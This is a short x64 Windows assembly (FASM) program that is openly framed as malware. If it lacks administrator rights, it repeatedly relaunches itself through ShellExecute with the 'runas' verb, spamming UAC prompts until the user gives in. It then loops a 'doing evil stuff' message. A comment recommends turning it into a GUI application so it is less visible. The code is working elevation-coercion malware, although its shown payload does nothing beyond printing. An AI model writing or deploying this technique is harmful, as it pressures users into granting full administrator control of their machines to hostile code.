Format PE64 Console
; To be really evil, make this a GUI application
include 'win64a.inc'
entry start

section '.data' readable writable
szRunAs   db "runas", 0
szMsg1    db "[i] This will force you to run as administrator!", 0xA, 0
szMsg2    db "[!] You gave into the malware! Doing evil stuff...", 0xA, 0
bPath     rb MAX_PATH + 1

section '.text' readable writable executable
start:
        sub rsp, 8 ; Align stack
        ; Check if admin
        invoke IsNTAdmin, 0, 0
        cmp ax, TRUE
        je gotAdmin
        invoke GetModuleFileNameA, 0, bPath, MAX_PATH
        cinvoke printf, szMsg1

        @@:
        invoke ShellExecute, 0, szRunAs, bPath, 0, 0, SW_SHOWNORMAL
        invoke GetLastError
        test ax, ax
        jne @b

        gotAdmin:
        cinvoke printf, szMsg2
        invoke Sleep, 3000
        jmp gotAdmin
        invoke ExitProcess, 0 ; In normal execution flow, we should never reach this call


section '.idata' import readable writable
library kernel32, 'kernel32.dll',\
        Shell32, 'Shell32.dll',\
        msvcrt, 'msvcrt.dll',\
        advpack, 'advpack.dll'

include 'api\kernel32.inc'
import Shell32,\
       ShellExecute, 'ShellExecuteA'
import msvcrt,\
       printf, 'printf'
import advpack,\
       IsNTAdmin, 'IsNTAdmin'
